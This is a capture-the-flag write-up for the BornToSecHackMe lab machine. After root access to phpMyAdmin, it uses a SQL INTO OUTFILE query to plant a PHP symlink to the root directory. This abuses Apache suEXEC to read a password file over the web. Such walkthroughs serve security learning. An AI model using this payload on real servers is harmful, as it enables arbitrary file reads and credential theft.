[See detailed writeup here](../writeup1.md)

Now after connecting to Phpmyadmin as root, this time we will use the Apache suEXEC vulnerability instead of a webshell.

```
zaz@BornToSecHackMe:~$ apache2 -v
Server version: Apache/2.2.22 (Ubuntu)
Server built:   Jul 24 2015 17:25:42
```

```
https://www.exploit-db.com/exploits/27397
```

You can analyze it in more detail from here.


```
SELECT 1, '<?php symlink(\"/\", \"lujiangz\");?>' INTO OUTFILE '/var/www/forum/templates_c/suexec.php'
```

When we execute this, we symbolically link the `/` directory (root directory) and name it `lujiangz`.
Now all we need to do is visit the `/forum/templates_c/suexec.php` endpoint to perform the exploit. Then we can look at the `/forum/templates_c/lujiangz` file.


After that

```
https://192.168.193.128/forum/templates_c/lujiangz/home/LOOKATME/password
```

Just like in Writeup1, we can continue on our way to become root.